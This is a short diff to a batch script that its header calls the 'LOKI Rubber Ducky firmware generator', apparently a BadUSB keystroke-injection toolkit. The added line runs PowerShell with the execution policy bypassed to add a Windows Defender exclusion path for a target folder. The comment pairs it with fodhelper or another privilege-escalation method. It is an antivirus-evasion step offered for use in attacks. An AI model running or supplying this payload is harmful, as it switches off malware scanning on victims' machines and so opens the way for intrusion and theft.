@@ -1,1 +1,9 @@
-powershell.exe %powerPolicy% -Command Add-MpPreference -ExclusionPath "C:\yourpath"
+::===============================================================
+:: LOKI RUBBER DUCKY FIRMWARE GENERATOR Version 2.2
+::
+:: exclusion path in windows defender
+:: use with fodhelper or any privileges escalation
+::===============================================================
+
+
+powershell.exe -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath "C:\TARGET_PATH"
